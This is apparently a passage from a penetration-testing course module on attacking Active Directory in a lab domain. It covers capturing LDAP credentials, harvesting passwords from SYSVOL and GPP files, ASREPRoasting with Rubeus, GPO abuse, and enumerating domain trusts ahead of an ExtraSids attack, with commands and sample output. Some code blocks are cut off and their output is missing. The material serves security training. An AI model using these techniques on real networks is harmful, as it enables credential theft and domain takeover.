Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this [post](https://grimhacker.com/2018/03/09/just-a-printer/).

* * *

## Enumerating DNS Records

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as `BloodHound` is similar to `SRV01934.INLANEFREIGHT.LOCAL`. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as `JENKINS.INLANEFREIGHT.LOCAL`, which we can use to better plan out our attacks.

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.

#### Using adidnsdump

```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

Password:

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

```

#### Viewing the Contents of the records.csv File

```shell
head records.csv

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

```

If we run again with the `-r` flag the tool will attempt to resolve unknown records by performing an `A` query. Now we can see that an IP address of `172.16.5.240` showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.

#### Using the -r Option to Resolve Unknown Records

```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password:

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records

```

#### Finding Hidden Records in the records.csv File

```shell
head records.csv

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5

AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

```

* * *

## Other Misconfigurations

There are many other misconfigurations that can be used to further your access within a domain.

* * *

### Password in Description Field

Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

#### Finding Passwords in the Description Field using Get-Domain User

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!

```

* * *

## PASSWD\_NOTREQD Field

It is possible to come across domain accounts with the [passwd\_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.

#### Checking for PASSWD\_NOTREQD Setting using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT

```

* * *

## Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named `reset_local_admin_pass.vbs`.

#### Discovering an Interesting Script

```powershell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/18/2021  10:44 AM            174 daily-runs.zip
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs

```

Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux` section.

#### Finding a Password in the Script

```powershell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

The XML looks like the following:

#### Viewing Groups.xml

![image](https://academy.hackthebox.com/storage/modules/143/GPP.png)

If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

#### Decrypting the Password with gpp-decrypt

```shell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1

```

GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

#### Locating & Retrieving GPP Passwords with CrackMapExec

```shell
crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

```

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the [gpp\_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.

#### Using CrackMapExec's gpp\_autologin Module

```shell
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']

```

In the output above, we can see that we have retrieved the credentials for an account called `guarddesk`. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.

A theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS\_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

#### Viewing an Account with the Do not Require Kerberos Preauthentication Option

![image](https://academy.hackthebox.com/storage/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the [Rubeus](https://github.com/GhostPack/Rubeus) toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

#### Enumerating for DONT\_REQ\_PREAUTH Value using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : [email protected]
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

```

With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

#### Retrieving AS-REP in Proper Format using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

With a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.

We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.

## Group Policy Object (GPO) Abuse

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.

GPO misconfigurations can be abused to perform the following attacks:

- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.

Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.

#### Enumerating GPO Names with PowerView

```powershell
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services

```

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.

#### Enumerating GPO Names with a Built-In Cmdlet

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access

```

Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

#### Enumerating Domain User GPO Rights

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

Here we can see that the Domain Users group has various permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.

#### Converting GPO GUID to Name

```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled

ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

```

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

![image](https://academy.hackthebox.com/storage/modules/143/gporights.png)

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

![image](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)

We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.

* * *

## Onwards

We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

- Active Directory Certificate Services (AD CS) attacks
- Kerberos Constrained Delegation
- Kerberos Unconstrained Delegation
- Kerberos Resource-Based Constrained Delegation (RBCD)

In the following few sections, we will briefly cover attacking AD trusts. This is a vast and complicated topic that will be covered in-depth in a later module.


# Domain Trusts Primer

* * *

## Scenario

Many large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. In doing so, you can avoid migrating all the established objects, making integration much quicker. This trust can also introduce weaknesses into the customer's environment if they are not careful. A subdomain with an exploitable flaw or vulnerability can provide us with a quick route into the target domain. Companies may also establish trusts with other companies (such as an MSP), a customer, or other business units of the same company (such as a division of the company in another geographical region). Let's explore domain trusts more and how we can abuse built-in functionality during our assessments.

* * *

## Domain Trusts Overview

A [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:

- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.

When establishing a trust, certain elements can be modified depending on the business case.

Trusts can be transitive or non-transitive.

- A `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.

Adapted from [here](https://zindagitech.com/wp-content/uploads/2021/09/Picture2-Deepak-4.png.webp)

#### Trust Table Side By Side

| Transitive | Non-Transitive |
| --- | --- |
| Shared, 1 to many | Direct trust |
| The trust is shared with anyone in the forest | Not extended to next level child domains |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

An easy comparison to make can be package delivery to your house. For a `transitive` trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a `non-transitive` trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.

Trusts can be set up in two directions: one-way or two-way (bidirectional).

- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.

Domain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of "end-around" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Often, we will find that the larger organization is unaware that a trust relationship exists with one or more domains.

Below is a graphical representation of the various trust types.

## Enumerating Trust Relationships

We can use the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.

#### Using Get-ADTrust

```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional

ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False

TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

```

The above output shows that our current domain `INLANEFREIGHT.LOCAL` has two domain trusts. The first is with `LOGISTICS.INLANEFREIGHT.LOCAL`, and the `IntraForest` property shows that this is a child domain, and we are currently positioned in the root domain of the forest. The second trust is with the domain `FREIGHTLOGISTICS.LOCAL,` and the `ForestTransitive` property is set to `True`, which means that this is a forest trust or external trust. We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. This is important to note down during an assessment. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across the trust.

Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the [Get-DomainTrust](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/) function to enumerate what trusts exist, if any.

#### Checking for Existing Trusts using Get-DomainTrust

```powershell
PS C:\htb> Get-DomainTrust

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

```

PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.

#### Using Get-DomainTrustMapping

```powershell
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:08 PM
WhenChanged     : 2/27/2022 12:02:41 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

```

From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:

#### Checking Users in the Child Domain using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

samaccountname
--------------
htb-student_adm
Administrator
Guest
lab_adm
krbtgt

```

Another tool we can use to get Domain Trust is `netdom`. The `netdom query` sub-command of the `netdom` command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.

#### Using netdom to query domain trust

```cmd-session
C:\htb> netdom query /domain:inlanefreight.local trust
Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========

<->       LOGISTICS.INLANEFREIGHT.LOCAL
Direct
 Not found

<->       FREIGHTLOGISTICS.LOCAL
Direct
 Not found

The command completed successfully.

```

#### Using netdom to query domain controllers

```cmd-session
C:\htb> netdom query /domain:inlanefreight.local dc
List of domain controllers with accounts in the domain:

ACADEMY-EA-DC01
The command completed successfully.

```

#### Using netdom to query workstations and servers

```cmd-session
C:\htb> netdom query /domain:inlanefreight.local workstation
List of workstations with accounts in the domain:

ACADEMY-EA-MS01
ACADEMY-EA-MX01      ( Workstation or Server )

SQL01      ( Workstation or Server )
ILF-XRG      ( Workstation or Server )
MAINLON      ( Workstation or Server )
CISERVER      ( Workstation or Server )
INDEX-DEV-LON      ( Workstation or Server )
...SNIP...

```

We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.

## Onwards

In the following few sections, we will cover common attacks that we can perform against child --> parent domain trusts and across bidirectional forest trusts. These types of attacks should not be overlooked, but we should always check with our client to ensure that any trusts we uncover during our enumeration are in scope for the assessment and we are not going outside the Rules of Engagement.


# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

* * *

## SID History Primer

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

* * *

## ExtraSids Attack - Mimikatz

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

